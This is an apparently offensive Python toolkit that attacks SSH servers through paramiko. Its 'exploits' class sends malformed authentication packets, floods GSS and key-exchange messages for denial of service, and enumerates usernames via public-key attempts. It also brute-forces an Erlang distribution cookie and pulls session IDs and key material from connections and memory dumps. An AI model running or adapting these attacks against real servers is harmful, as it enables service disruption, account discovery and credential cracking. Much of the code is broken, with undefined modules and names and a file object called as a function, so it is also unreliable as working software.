#!/bin/env python
import main
import socket
import listen as connect_listen
from scapy.all import *
import datetime
import xml.etree.ElementTree as ET
import paramiko
from paramiko.common import cMSG_SERVICE_REQUEST, cMSG_USERAUTH_REQUEST
import logging
import math
import gssapi
import hashlib
import binascii
from binascii import b2a_hex
from scipy import stats

old_parse_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

class exploits(connect_listen.connect_listen):
 def __init__(self,hostname, port, username, password ):
   super().__init__(hostname, port, username, password)

 def _TABLE():
    """ Monkey patch paramiko to send invalid SSH2_MSG_USERAUTH_REQUEST.
        patches the following internal `AuthHandler` functions by updating the internal `_handler_table` dict
            _parse_service_accept
            _parse_userauth_failure
        _handler_table = {
            MSG_SERVICE_REQUEST: _parse_service_request,
            MSG_SERVICE_ACCEPT: _parse_service_accept,
            MSG_USERAUTH_REQUEST: _parse_userauth_request,
            MSG_USERAUTH_SUCCESS: _parse_userauth_success,
            MSG_USERAUTH_FAILURE:: _parse_userauth_failure,
            MSG_USERAUTH_BANNER: _parse_userauth_banner,
            MSG_USERAUTH_INFO_REQUEST: _parse_userauth_info_request,
            MSG_USERAUTH_INFO_RESPONSE: _parse_userauth_info_response,
        }
    """

 def get_connect(self, hostname, port, password, username):
    outer = connect_listen.connect_listen(hostname , port, password , username)
    return outer

 def info_dump(self):
   socket = connect_listen.connect_listen.socket_in(self)
   local = connect_listen.connect_listen.socket_transport(self)
   print(local)
   print(socket.recv(100))
   print(local._compression_info)
   print(local._cipher_info)
   print(local._get_latest_kex_init)
   print(local._channels)
   print(local._kex_info)
   print(local._key_info)
   print(local._mac_info)
   print(local.kex_engine)
   print(local.kexgss_ctxt)
   print(local._handler_table)
   print(local._channel_handler_table)
   print(local._channels)
   print(local.channel_events)
   print(local.channels_seen)
   print(local.get_server_key())
   print(f'Banner {local.get_banner()}')
   print(f'local._expected_packet{local._expected_packet}')
   print(f'local.default_max_packet_size{local.default_max_packet_size}')
   print(f'local.remote_cipher {local.remote_cipher}')
   print(f'local.remote_compression {local.remote_compression}')
   print(f'local.remote_mac {local.remote_mac}')
   print(f'remote_kex_init {local.remote_kex_init}')
   print(f'session id hashed {local.session_id}')
   print(f'disable algorithms{local.disabled_algorithms}')
   print(f'sys {local.sys}')

 def channel_info(self):
   socket = connect_listen.connect_listen.socket_in(self)
   local = connect_listen.connect_listen.socket_transport(self)

   for x in range(100):
    channel = paramiko.Channel(x)
    channel._set_transport(local)
    try:
     print(channel.transport)
     print(channel.status_event)
     print(channel.chanid)
     print(channel._event_pending())
     print(channel.ultra_debug)
     print(channel.out_buffer_cv)
     print(channel.origin_addr)
     print(channel._set_remote_channel(channel.chanid))
    except:
     print(channel.status_event)

 def malform_packet(self):
   socket = connect_listen.connect_listen.socket_in(self)
   local = connect_listen.connect_listen.socket_transport(self)



   m = paramiko.Message()
   m.add_byte(cMSG_USERAUTH_REQUEST)
   m.add_string("ssh-userauth")

   local.packetizer.send_message(m)

   m = paramiko.Message()
   m.add_byte(cMSG_SERVICE_REQUEST)
   m.add_string("ssh-userauth")
   m.add_string("ssh-connection")
   m.add_string('publickey')
   m.add_boolean(True)
   m.add_string('ssh-ed25519')
   m.add_string(b'\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x15')
   m.add_string(b'\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x00')

   local.packetizer.send_message(m)


   try:
    print(socket.recv(n = 15))
   except:
    pass

 def memory_reg(self):
  socket =  connect_listen.connect_listen.socket_in(self)
  local = connect_listen.connect_listen.socket_transport(self)
  channel = paramiko.Channel(0)
  buff = paramiko.buffered_pipe.BufferedPipe()
  buff_compare = paramiko.buffered_pipe.BufferedPipe()


  thread_buff = paramiko.buffered_pipe.threading

  print(thread_buff.main_thread())

  overflow = local.session_id

  buff_compare.feed(data =  bytes(overflow))

  print("reading session id")
  buff.feed(data = overflow)
  print("buffer matrix")

  print(buff._buffer)
  print(buff_compare._buffer)

  print(len(overflow))
  hasha = hashlib.sha256()

  hasha.update(bytes(overflow))
  print(hasha.digest_size)
  print(hasha.block_size)

  print(stats.kendalltau(buff._buffer, buff_compare._buffer))



  print((local.session_id))
  print(binascii.hexlify(local.session_id).decode('utf8'))




  all_objects = muppy.get_objects()
  sum1 = summary.summarize(all_objects)
  summary.print_(sum1)
  return binascii.hexlify(local.session_id).decode('utf8')

 def gss_overflow(self, n, service):
  socket = connect_listen.connect_listen.socket_in(self)
  local = connect_listen.connect_listen.socket_transport(self)
  gss = paramiko.GSSAuth(self.hostname, True)
  pack = paramiko.Packetizer(socket)




  gss_mic = gss._ssh_build_mic((local.session_id), self.username, f'{service}', "keyex")
  m = paramiko.Message()

  for x in range(n):
   try:
    print(m.add_string(gss_mic))
    pack.send_message(m)
   except:
    pass

 def _debug(self):
   print("sniffing on port 22")
   os.system("tcpdump -s 0 port 22")

 def challenge(self):
   s = connect_listen.connect_listen.socket_in(self)
   challenge = s.recv(1024)   
   challenge = struct.unpack(">I", challenge[9:13])[0]
   print(challenge)
   return challenge


 def _handlers(self):
  paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
  paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error


 def xml_overflow(self, xdir):
  xml = xdir
  socket = connect_listen.connect_listen.socket_in(self)
  local = connect_listen.connect_listen.socket_transport(self)
  print(local.channel_events)


  try:
   connect_listen.connect_listen.invoke_subsytem(self, "netconf")
   print(local.channels_seen)

   print("...compressing XML document")

   com = lzma.LZMACompressor(format=FORMAT_XZ, check=- 1, preset=None, filters=None)
   print(ET.tostring(xml, encoding='utf-8'))
   content = com.compress(xml)
   m = paramiko.Message()

   m.add(content)
   local.packetizer.send_message(m)
   print(local.packetizer.read_all(n = 100, check_rekey= False))
  except:
   print(local.channel_events)
   print(local.channels_seen)


 def erlangcookie(self, *cookie):
   name_msg  = b"\x00 "
   name_msg += b"\x15"
   name_msg += b"n"
   name_msg += b"\x00\x07"
   name_msg += b"\x00\x03\x49\x9c"
   name_msg += b"AAAAAA@AAAAAAA"

   challenge_reply  = b"\x00\x15"
   challenge_reply += b"r"
   challenge_reply += b"\x01\x02\x03\x04"

   for c in cookie:
    challenge_reply += md5(bytes(c, "ascii") + self.challenge(), "ascii").digest() # argv is the erlang cookie

    connect_listen.connect_listen.socket_in(self).send(challenge_reply)
    if len(connect_listen.connect_listen.socket_in(self).recv(100)): print(f'[+] Cookie {c}')



 def pointer_denial(self, n):
    socket = connect_listen.connect_listen.socket_in(self)
    local = connect_listen.connect_listen.socket_transport(self)
    clientid = "PuTTY_Release_0.64"

    local.local_version = f"SSH-2.0-{clientid}"
    print(local.local_version)
    for x in range(n):
     try:
      local.connect(None, self.username, self.password)
      local.close()
     except:
      pass



 def userenum(self, sfile):

  fuser = open(str(sfile), "rb+")
  socket = connect_listen.connect_listen.socket_in(self)
  transport = connect_listen.connect_listen.socket_transport(self)

  for x in fuser():
   try:
    self.username = x
    transport.auth_publickey(self.username, paramiko.RSAKey.generate(1024))
    print(self.username)
   except:
    pass

 def cipher_memory(self, fi, bfs):
  print("... finding key in memory file")
  with open(str(fi), 'rb+') as f:

   temp_key=f.read()
   temp_key_str=b2a_hex(temp_key)
   n = 2
   Dict = {}
   FREQ_ARR = []
   while len(FREQ_ARR) <= 100:
    temp_key_list=[temp_key_str[i:i+n] for i in range(0, len(temp_key_str), n)]

    print(temp_key_list)
    counter = collections.Counter(temp_key_list)
    result = dict(counter)

    for value in result.values():
     freq = value / len(temp_key_list)
     FREQ_ARR.append(freq * math.log(1/freq))
     print(value, freq)

     if freq > .5:
      print(f'High entropy value {value, freq}')



 def malformed_gss(self, payload, n):
  socket =  connect_listen.connect_listen.socket_in(self)
  local = connect_listen.connect_listen.socket_transport(self)

  message = gss._ssh_build_mic((local.session_id), self.username, f'{payload}', "keyex")

  socket.recv(100)
  m = paramiko.Message()
  m.add(message)

  for x in range(n):
   local._send_message(m)



 def kex_init_denial(self, n):
    socket =  connect_listen.connect_listen.socket_in(self)
    local = connect_listen.connect_listen.socket_transport(self)
    print(local.kexgss_ctxt)
    for i in range(n):
      try:
       local._send_kex_init()
       print(local._latest_kex_init)
       print(local.subsystem_table)
       local.close()
      except:
        pass

